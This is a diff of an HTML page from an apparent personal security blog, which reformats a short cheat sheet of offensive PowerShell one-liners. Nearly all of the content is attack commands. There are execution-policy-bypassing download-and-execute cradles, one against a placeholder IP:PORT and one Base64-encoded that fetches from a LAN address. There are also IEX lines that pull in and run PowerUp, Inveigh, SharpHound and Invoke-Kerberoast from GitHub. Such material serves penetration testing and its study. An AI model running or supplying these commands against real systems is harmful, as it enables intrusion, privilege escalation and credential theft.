@@ -53,7 +53,7 @@ Oneliners/commands for powershell.
 
 <meta itemprop="datePublished" content="2020-02-08T17:21:41&#43;01:00" />
 <meta itemprop="dateModified" content="2020-02-08T17:21:41&#43;01:00" />
-<meta itemprop="wordCount" content="96">
+<meta itemprop="wordCount" content="91">
 
 
 
@@ -146,55 +146,28 @@ Oneliners/commands for powershell.
 <p>Oneliners/commands for powershell.</p>
 </blockquote>
 
-<p>##Test</p>
-
 <h2 id="base64">Base64</h2>
 
-<ul>
-<li><p>Simple string encode</p>
+<p>Simple string encode</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[System.Convert]</span>::ToBase64String(<span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetBytes(<span style="color:#e6db74">&#34;ENCODE THIS :  </span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74">STR</span><span style="color:#ae81ff">`&#34;</span><span style="color:#e6db74"> !&#34;</span>))</code></pre></div>
-<ul>
-<li>Simple string decode
-<code>powershell
-[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;RU5DT0RFIFRISVMgOiAgIlNUUiIgIQ==&quot;))
-</code></li>
-</ul></li>
-</ul>
-
+<p>Simple string decode</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">[System.Text.Encoding]</span>::UTF8.GetString(<span style="color:#66d9ef">[System.Convert]</span>::FromBase64String(<span style="color:#e6db74">&#34;RU5DT0RFIFRISVMgOiAgIlNUUiIgIQ==&#34;</span>))</code></pre></div>
 <h2 id="download-exec">Download/Exec</h2>
 
-<ul>
-<li><p>HTTP cleartext dl/exec</p>
+<p>HTTP cleartext dl/exec</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -Sta -Nop -exec bypass -c <span style="color:#e6db74">&#34;(New-Object Net.WebClient).DownloadString(&#39;http://IP:PORT/a.html&#39;)&#34;</span></code></pre></div>
-<ul>
-<li>HTTP encoded dl/exec
-<code>powershell
-powershell -Sta -Nop -exec bypass -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA1AC8AYQAuAGgAdABtAGwAJwApAA===
-</code></li>
-</ul></li>
-</ul>
-
+<p>HTTP encoded dl/exec</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -Sta -Nop -exec bypass -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA1AC8AYQAuAGgAdABtAGwAJwApAA===</code></pre></div>
 <h2 id="exec-useful-modules">Exec useful modules</h2>
 
-<ul>
-<li><p>PowerUp.ps1 / Invoke-Allchecks</p>
+<p>PowerUp.ps1 / Invoke-Allchecks</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Invoke-AllChecks&#34;</span></code></pre></div>
-<ul>
-<li>Inveigh.ps1 / Responder
-<code>powershell
-powershell.exe -exec Bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y  -Proxy Y -LogOutput Y -FileOutput Y&quot;
-</code></li>
-</ul></li>
-
-<li><p>Bloodhound</p>
+<p>Inveigh.ps1 / Responder</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"> powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1&#39;);Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y  -Proxy Y -LogOutput Y -FileOutput Y&#34;</span></code></pre></div>
+<p>Bloodhound</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1&#39;);Invoke-BloodHound&#34;</span></code></pre></div>
-<ul>
-<li>Invoke-Kerberoast
-<code>powershell
-powershell.exe -exec Bypass -C &quot;IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat  | fl&quot;
-</code></li>
-</ul></li>
-</ul>
+<p>Invoke-Kerberoast</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -exec Bypass -C <span style="color:#e6db74">&#34;IEX(New-Object Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1&#39;); Invoke-Kerberoast -OutputFormat hashcat  | fl&#34;</span></code></pre></div>
             </div>
         </article>
 
@@ -205,7 +178,7 @@ powershell.exe -exec Bypass -C &quot;IEX(New-Object Net.Webclient).DownloadStrin
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://kaluche.github.io/tags/powershell">powershell</a></span><span class="tag"><a href="https://kaluche.github.io/tags/windows">windows</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>96 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>91 Words</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-02-08 17:21 &#43;0100</p>
         </div>
